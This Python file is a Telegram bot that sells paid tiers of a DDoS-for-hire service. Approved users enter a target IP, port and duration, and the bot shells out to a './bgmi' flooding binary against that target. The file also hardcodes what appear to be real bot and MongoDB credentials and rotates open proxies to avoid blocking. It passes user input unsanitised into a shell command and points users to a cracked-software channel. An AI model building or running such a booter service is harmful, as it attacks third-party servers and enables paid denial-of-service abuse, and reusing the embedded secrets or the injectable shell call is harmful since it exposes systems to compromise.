import os
import telebot
import json
import requests
import logging
import time
from pymongo import MongoClient
from datetime import datetime, timedelta
import certifi
import random
from subprocess import Popen
from threading import Thread
import asyncio
import aiohttp
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

loop = asyncio.get_event_loop()

TOKEN = '6838194158:AAHqbBenIho84b31Zj4KHcQ8hYAOrvPcDLs'
MONGO_URI = 'mongodb+srv://admin:kpR4ObsewTySq48I@test.zeqrmgb.mongodb.net/test_db?retryWrites=true&w=majority&appName=piro&tlsAllowInvalidCertificates=true'
FORWARD_CHANNEL_ID = -1002249524106
CHANNEL_ID =-1002249524106
error_channel_id = -1002249524106

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['soul']
users_collection = db.users

bot = telebot.TeleBot(TOKEN)
REQUEST_INTERVAL = 1

blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]  # Blocked ports list

async def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    await start_asyncio_loop()

def update_proxy():
    proxy_list = [
      "https://223.30.190.74:8080",
"https://117.208.148.72:3128",
"https://112.133.215.24:8080",
"https://202.134.191.156:8080",
"https://103.241.227.106:6666",
"https://103.46.233.190:83",
"https://103.240.161.109:6666",
"https://103.248.93.5:8080",
"https://103.35.132.189:83",
"https://103.99.8.106:83",
"https://103.47.67.114:8080",
"https://175.101.81.251:8080",
"https://45.248.139.140:8080",
"https://125.62.213.33:84",
"https://202.133.49.205:83",
"https://103.15.60.21:8080",
"https://103.224.39.2:83",
"https://103.216.82.37:6666",
"https://103.21.163.81:6666",
"https://103.251.225.163:6666",
"https://152.67.1.199:8000",
"https://14.97.2.106:80",
"https://14.97.2.107:80",
"https://103.35.135.2:84",
"https://182.72.150.242:8080",	
"https://180.179.98.22:3128",
"https://14.97.2.105:80",	
"https://14.140.131.82:3128",
"https://103.81.214.205:83",	
"https://203.192.217.11:8080",
"https://125.62.213.33:83",	
"https://27.116.51.178:6666",
"https://103.250.157.39:6666",	
"https://27.116.51.119:8080"

    ]
    proxy = random.choice(proxy_list)
    telebot.apihelper.proxy = {'https': proxy}
    logging.info("Proxy updated successfully.")

@bot.message_handler(commands=['update_proxy'])
def update_proxy_command(message):
    chat_id = message.chat.id
    try:
        update_proxy()
        bot.send_message(chat_id, "Proxy updated successfully.")
    except Exception as e:
        bot.send_message(chat_id, f"Failed to update proxy: {e}")

async def start_asyncio_loop():
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)

async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./bgmi {target_ip} {target_port} {duration} 100")
    await process.communicate()

def is_user_admin(user_id, chat_id):
    try:
        return bot.get_chat_member(chat_id, user_id).status in ['administrator', 'creator']
    except:
        return False

@bot.message_handler(commands=['approve', 'disapprove'])
def approve_or_disapprove_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    is_admin = is_user_admin(user_id, CHANNEL_ID)
    cmd_parts = message.text.split()

    if not is_admin:
        bot.send_message(chat_id, "*You are not authorized to use this command*", parse_mode='Markdown')
        return

    if len(cmd_parts) < 2:
        bot.send_message(chat_id, "*Invalid command format. Use /approve <user_id> <plan> <days> or /disapprove <user_id>.*", parse_mode='Markdown')
        return

    action = cmd_parts[0]
    target_user_id = int(cmd_parts[1])
    plan = int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0
    days = int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0

    if action == '/approve':
        if plan == 1:  # Instant Plan 🧡
            if users_collection.count_documents({"plan": 1}) >= 99:
                bot.send_message(chat_id, "*Approval failed: Instant Plan 🧡 limit reached (99 users).*", parse_mode='Markdown')
                return
        elif plan == 2:  # Instant++ Plan 💥
            if users_collection.count_documents({"plan": 2}) >= 499:
                bot.send_message(chat_id, "*Approval failed: Instant++ Plan 💥 limit reached (499 users).*", parse_mode='Markdown')
                return

        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else datetime.now().date().isoformat()
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": plan, "valid_until": valid_until, "access_count": 0}},
            upsert=True
        )
        msg_text = f"*User {target_user_id} approved with plan {plan} for {days} days.*"
    else:  # disapprove
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": 0, "valid_until": "", "access_count": 0}},
            upsert=True
        )
        msg_text = f"*User {target_user_id} disapproved and reverted to free.*"

    bot.send_message(chat_id, msg_text, parse_mode='Markdown')
    bot.send_message(CHANNEL_ID, msg_text, parse_mode='Markdown')
@bot.message_handler(commands=['Attack'])
def attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    try:
        user_data = users_collection.find_one({"user_id": user_id})
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "You are not approved to use this bot. Please contact the administrator.")
            return

        if user_data['plan'] == 1 and users_collection.count_documents({"plan": 1}) > 99:
            bot.send_message(chat_id, "Your Instant Plan 🧡 is currently not available due to limit reached.")
            return

        if user_data['plan'] == 2 and users_collection.count_documents({"plan": 2}) > 499:
            bot.send_message(chat_id, "Your Instant++ Plan 💥 is currently not available due to limit reached.")
            return

        bot.send_message(chat_id, "Enter the target IP, port, and duration (in seconds) separated by spaces.")
        bot.register_next_step_handler(message, process_attack_command)
    except Exception as e:
        logging.error(f"Error in attack command: {e}")

@bot.message_handler(commands=['Attack'])
def attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    try:
        user_data = users_collection.find_one({"user_id": user_id})
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "*You are not approved to use this bot. Please contact the administrator.*", parse_mode='Markdown')
            return

        if user_data['plan'] == 1 and users_collection.count_documents({"plan": 1}) > 99:
            bot.send_message(chat_id, "*Your Instant Plan 🧡 is currently not available due to limit reached.*", parse_mode='Markdown')
            return

        if user_data['plan'] == 2 and users_collection.count_documents({"plan": 2}) > 499:
            bot.send_message(chat_id, "*Your Instant++ Plan 💥 is currently not available due to limit reached.*", parse_mode='Markdown')
            return

        bot.send_message(chat_id, "*Enter the target IP, port, and duration (in seconds) separated by spaces.*", parse_mode='Markdown')
        bot.register_next_step_handler(message, process_attack_command)
    except Exception as e:
        logging.error(f"Error in attack command: {e}")

def process_attack_command(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "*Invalid command format. Please use: /Attack target_ip target_port time*", parse_mode='Markdown')
            return
        target_ip, target_port, duration = args[0], int(args[1]), args[2]

        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"*Port {target_port} is blocked. Please use a different port.*", parse_mode='Markdown')
            return

        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
        bot.send_message(message.chat.id, f"*Attack started 💥\n\nHost: {target_ip}\nPort: {target_port}\nTime: {duration}*", parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in processing attack command: {e}")

def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_until_complete(start_asyncio_loop())

@bot.message_handler(commands=['start'])
def send_welcome(message):
    # Create a markup object
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)

    # Create buttons
    btn1 = KeyboardButton("Instant Plan 🧡")
    btn2 = KeyboardButton("Instant++ Plan 💥")
    btn3 = KeyboardButton("Canary Download✔️")
    btn4 = KeyboardButton("My Account🏦")
    btn5 = KeyboardButton("Help❓")
    btn6 = KeyboardButton("Contact admin✔️")

    # Add buttons to the markup
    markup.add(btn1, btn2, btn3, btn4, btn5, btn6)

    bot.send_message(message.chat.id, "*Choose an option:*", reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    if message.text == "Instant Plan 🧡":
        bot.reply_to(message, "*Instant Plan selected*", parse_mode='Markdown')
    elif message.text == "Instant++ Plan 💥":
        bot.reply_to(message, "*Instant++ Plan selected*", parse_mode='Markdown')
        attack_command(message)
    elif message.text == "Canary Download✔️":
        bot.send_message(message.chat.id, "*Please use the following link for Canary Download: https://t.me/SOULCRACKS/10599*", parse_mode='Markdown')
    elif message.text == "My Account🏦":
        user_id = message.from_user.id
        user_data = users_collection.find_one({"user_id": user_id})
        if user_data:
            username = message.from_user.username
            plan = user_data.get('plan', 'N/A')
            valid_until = user_data.get('valid_until', 'N/A')
            current_time = datetime.now().isoformat()
            response = (f"*USERNAME: {username}\n"
                        f"Plan: {plan}\n"
                        f"Valid Until: {valid_until}\n"
                        f"Current Time: {current_time}*")
        else:
            response = "*No account information found. Please contact the administrator.*"
        bot.reply_to(message, response, parse_mode='Markdown')
    elif message.text == "Help❓":
        bot.reply_to(message, "*Help selected*", parse_mode='Markdown')
    elif message.text == "Contact admin✔️":
        bot.reply_to(message, "*Contact admin selected*", parse_mode='Markdown')
    else:
        bot.reply_to(message, "*Invalid option*", parse_mode='Markdown')

if __name__ == "__main__":
    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
    asyncio_thread.start()
    logging.info("Starting Codespace activity keeper and Telegram bot...")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"An error occurred while polling: {e}")
        logging.info(f"Waiting for {REQUEST_INTERVAL} seconds before the next request...")
        time.sleep(REQUEST_INTERVAL)
